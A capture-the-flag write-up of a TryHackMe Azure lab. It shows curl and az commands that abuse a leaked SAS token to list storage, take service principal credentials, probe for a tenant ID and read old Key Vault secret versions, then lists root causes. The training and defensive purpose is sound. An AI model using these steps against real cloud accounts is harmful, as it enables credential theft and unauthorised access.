# TryHackMe Hacker Holidays 2026 — CryptoCabana (The Byte Lotus Hotel)

**Category:** Cloud
**Difficulty:** Medium
**Points:** 90

## Scenario

CryptoCabana is a "kiosk" web app supposedly backing up wallet seed phrases to a private vault, with the landing page promising: *"Backed up. Sleep easy."* The objective was to figure out what the kiosk implicitly trusts to reach into storage on its own, and see how far that trust actually extended.

## Recon: The Static Site

The target was an Azure Static Website:

```
https://cryptocabanaf5scjagc.z13.web.core.windows.net/
```

The `z13.web.core.windows.net` suffix is the signature of Azure Blob Storage static website hosting. The landing page was a simple form that took a "recovery phrase" and POSTed it somewhere on button click, with the logic offloaded to an external script:

```html
<script src="app.js"></script>
```

## Leaked SAS Token in Client-Side JS

Pulling `app.js` revealed the storage account name, container, and — critically — a SAS (Shared Access Signature) token baked directly into client-side code:

```js
const STORAGE_ACCOUNT = "cryptocabanaf5scjagc";
const BACKUPS_CONTAINER = "backups";
const BACKUP_SAS = "?sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&...";
```

The app only ever used this token to `PUT` blobs into `backups/`. But the token's permission string told a different story:

- `sp=rl` → **r**ead + **l**ist permissions (not just write)
- `srt=sco` → scoped to **s**ervice, **c**ontainer, **and o**bject level

A write-only kiosk had shipped a token with far broader scope than its own functionality needed — a classic over-permissioned SAS.

## Enumerating Storage with the Leaked Token

Using the token's service-level list permission, I enumerated every container in the storage account:

```bash
curl -s "https://cryptocabanaf5scjagc.blob.core.windows.net/?comp=list&<SAS>"
```

This returned three containers: `$web` (the static site itself), `backups` (empty — the kiosk's intended container), and an unlinked third container: **`vault`**.

Listing `vault` surfaced two blobs:

```
backup-service-account.json
seed_phrase.txt
```

## Service Principal Credentials in Blob Storage

`backup-service-account.json` contained an Azure AD service principal credential — the automation identity behind the kiosk's own backup process:

```json
{
  "client_id": "dbcf2923-e4eb-4b72-a0a4-688aa1185cf5",
  "client_secret": "<THM_LAB_CLIENT_SECRET_REDACTED>",
  "key_vault_name": "ccabana-kv-f5scjagc",
  "key_vault_uri": "https://ccabana-kv-f5scjagc.vault.azure.net/",
  "note": "CryptoCabana backup automation account. Rotate this if it ever leaves the vault."
}
```

No `tenant_id` was included, which was clearly intentional.

## Recovering the Tenant ID via Unauthenticated Probing

Azure resource endpoints return tenant information in the `WWW-Authenticate` header on an unauthenticated request. Querying the management plane directly returned a generic, tenant-less response, but querying the Key Vault itself (a tenant-scoped resource) did the trick:

```bash
curl -s -D - -o /dev/null "https://ccabana-kv-f5scjagc.vault.azure.net/secrets?api-version=7.4"
```

```
WWW-Authenticate: Bearer authorization="https://login.microsoftonline.com/8f8c5f8e-42d3-4ceb-97ad-241bbf446d6c", resource="https://vault.azure.net"
```

Tenant ID recovered: `8f8c5f8e-42d3-4ceb-97ad-241bbf446d6c`

## Authenticating as the Service Principal

```bash
az login --service-principal \
  -u dbcf2923-e4eb-4b72-a0a4-688aa1185cf5 \
  -p '<THM_LAB_CLIENT_SECRET_REDACTED>' \
  --tenant 8f8c5f8e-42d3-4ceb-97ad-241bbf446d6c
```

The lab-provided client secret is intentionally redacted here. Substitute it locally during the room, but do not publish it.

Login succeeded, dropping into subscription `Az-Subs-CTF`.

## Enumerating Key Vault Secrets

```bash
az keyvault secret list --vault-name ccabana-kv-f5scjagc -o table
```

```
Name         Enabled    Expires
-----------  ---------  -------------------------
key-shard-1  True
key-shard-2  True
key-shard-3  True
master-key   True       2020-01-01T00:00:00+00:00
```

The naming convention (`key-shard-1/2/3`) suggested the flag was split across secrets rather than stored whole.

## RBAC: List ≠ Get

Reading the shard values worked fine:

```
key-shard-1 → THM{n0t_ur
key-shard-2 → Rotated this after IT flagged it -- old value should still be recoverable if you know where to look.
key-shard-3 → ur_c01ns!}
```

But `master-key` — a red herring, given its 2020 expiry — returned a hard `Forbidden`:

```
Code: Forbidden
Action: 'Microsoft.KeyVault/vaults/secrets/getSecret/action'
Inner error: { "code": "ForbiddenByRbac" }
```

The service principal's role assignment allowed `List` but not `Get` on that particular secret, demonstrating the difference between *knowing a secret exists* and *being authorized to read its value* under Key Vault's RBAC model.

## Recovering a Rotated Secret via Version History

`key-shard-2`'s current value was a decoy note pointing at its own history. Key Vault retains prior versions of a secret after rotation unless they're explicitly purged, so I listed its version history:

```bash
az keyvault secret list-versions --vault-name ccabana-kv-f5scjagc --name key-shard-2 -o json
```

Two versions existed, two seconds apart:

```
3d6492d2c6f74123bc754a9ded22b2a0   created 01:05:05
c922c422ffb34671a902389c372314f1   created 01:05:07
```

Reading the older version recovered the real middle shard:

```bash
az keyvault secret show --vault-name ccabana-kv-f5scjagc \
  --name key-shard-2 --version 3d6492d2c6f74123bc754a9ded22b2a0 \
  --query value -o tsv
```

```
_k3ys_n0t_
```

## Flag

Combining all three shards:

```
THM{n0t_ur_k3ys_n0t_ur_c01ns!}
```

## Root Causes

1. **Over-scoped SAS token** — the kiosk only needed write access to one container, but shipped a token with read/list at the service level, exposing the entire storage account's structure.
2. **Sensitive files in an unlinked container** — "unlinked" is not the same as "private." Anything reachable by a valid credential is reachable, regardless of whether the UI links to it.
3. **Long-lived credentials in blob storage** — a service principal secret stored in plaintext JSON, itself reachable via the leaked SAS token, created a privilege escalation path from a client-side artifact to an Azure AD identity.
4. **Tenant ID is not a secret, but it's also not needed for an attack** — resource-scoped Azure endpoints will hand back tenant info on unauthenticated requests, removing what might look like a barrier.
5. **Key Vault RBAC granularity did its job partially** — `List` without `Get` stopped direct reads of `master-key`, but didn't account for **secret version history**, which preserved the real shard value past its rotation.
